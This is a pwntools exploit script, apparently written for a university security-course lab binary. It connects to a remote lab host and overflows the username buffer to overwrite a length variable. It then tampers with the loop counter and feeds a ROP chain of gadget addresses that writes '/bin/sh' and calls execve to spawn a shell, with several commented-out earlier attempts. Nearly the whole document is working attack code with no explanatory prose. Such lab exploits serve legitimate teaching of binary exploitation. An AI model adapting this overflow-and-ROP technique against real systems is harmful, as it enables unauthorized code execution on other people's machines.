''' Script Module Importing '''
from pwn import *

SET_LENGTH = 25

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7063)      # Test Script Against Server
#p = process("./6-3_lab.bin")              # Test Script Locally
#p = gdb.debug("./6-3_lab.bin")            # Debug with GDB
#
#login()
#

#Username:
prog_prompt = p.readuntil(b'Username: ')                    # Read in User Prompt
print(prog_prompt)
payload = b'A'*40
payload += p64(SET_LENGTH << 32)

p.sendline(payload) 


#Password:
prog_prompt = p.readuntil(b'Password: ')                    # Read in User Prompt
print(prog_prompt)
p.sendline(b'BBBBBBB') 

#
#run()
#

#length
#"How big is your list of numbers (small, large)?: "
prog_prompt = p.readuntil(b'?: ')                    # Read in User Prompt

p.sendline(b'C') #send nonsense to make it skip overwriting len variable

#p.sendline(p64(0x68732f6e69622f))      #Set execve() filename: /bin/bash/ = 0x68732f6e69622f = 29400045130965551
# enter at "enter small or large", it wil put in rdi itself
#  0x401f2f <run+64>         mov    rdi, rax



for i in range(1, 12):
    p.sendline(str(i).encode()) #does not accept p.sendline(p64(i))
    #p.sendline(b'29400045130965551') 
#i
# 00000010 0000000a | 10  0000 000a
i = 11
payload_bytes = p32(i) + p32(SET_LENGTH)
payload_int = u64(payload_bytes)
payload_str = str(payload_int).encode()
p.sendline(payload_str)  # i = 11 | 0x120000000b
print(f"[ ] Updating 'len' and 'i' bytes: {hex(payload_int)}")


#rop?

for i in range(1, 4):
    #p.sendline(str(i).encode()) #does not accept p.sendline(p64(i))
    p.sendline(b'29400045130965551') 
    

p.sendline(b'4256878') #POP_RSI = 0x40f46e = 4256878
p.sendline(b'29400045130965551')
p.sendline(b'4546143')   #move [rdi], rsi = 0x455e5f
    
    
p.sendline(b'4563255')      #POP_RAX  = 0x0045a137 = 4563255
p.sendline(b'59')           #SYS_EXECVE  = 59

#p.sendline(b'4200674')                  #POP_RDI  = 0x004018e2 = 4200674
#p.sendline(b'987654321')        #Set execve() filename =  /bin/bash/ = 0x68732f6e69622f = 29400045130965551

p.sendline(b'4256878') #POP_RSI = 0x40f46e = 4256878
p.sendline(b'0') #EXECVE_ARGV = 0

p.sendline(b'4200431') #POP_RDX = 0x4017ef = 4200431
p.sendline(b'0') #EXECVE_ENVP = 0

p.sendline(b'4199139')             #SYS_CALL = 0x4012e3 = 4199139






'''
buffer = p64(0x4141414141414141)
len_i = p64(0x0000001000000001)
payload = buffer+len_i
p.sendline(payload)

#p.sendline(str(payload).encode())
'''
'''
# 0x[length][i]
i = 1  #count
p_range = p64(10)
p_range += p64((SET_LENGTH << 32) | i)
p.sendline(str(p_range))




p_range = p64((SET_LENGTH << 32) | i)   #packed data range 0x[length][i]
print(hexdump(p_range))
p.sendline(p_range)         #overwrite length with specific values so loop doesn't exit early

p.sendline(b'13')
p.sendline(b'14')
p.sendline(b'15')
p.sendline(b'16')
'''




'''
for each in range(11):
    print(f' sending {each+1}')
    p.sendline(p64(each+1))

# 0x[length][i]
i = 11
p_range = p64((SET_LENGTH << 32) | i)   #packed data range 0x[length][i]
print(hexdump(p_range))
p.sendline(p_range)         #overwrite length with specific values so loop doesn't exit early

for each in range(12, SET_LENGTH):
     p.sendline(p64(each+1))
'''












'''
#"How big is your list of numbers (small, large)?: "
prog_prompt = p.readuntil(b'?: ')                    # Read in User Prompt
print(prog_prompt)
p.sendline(b'CCCCCCCC') 
'''





'''
#payload = b'A'*56
payload = b''
for each in range(4):
    payload += p64(0x004018e2)               #POP_RDI = p64(0x004018e2)              ## Set Gadget 1: pop rdi; ret
    
    if each < 3:
        payload += p64(0x68732f6e69622f)         #SHELL_FILE = p64(0x68732f6e69622f)     ## Set execve() filename: /bin/bash/


p.sendline(payload) 
print(payload)

prog_prompt = p.readuntil(b'Password: ')                    # Read in User Prompt
print(prog_prompt)
p.sendline(payload) 
print(payload)


prog_prompt = p.readuntil(b'?: ')                    # Read in User Prompt
'''


'''

print(hexdump(p.read(115)))
print(hexdump(p.read(115)))
'''
# Start Interactive Session
p.interactive()
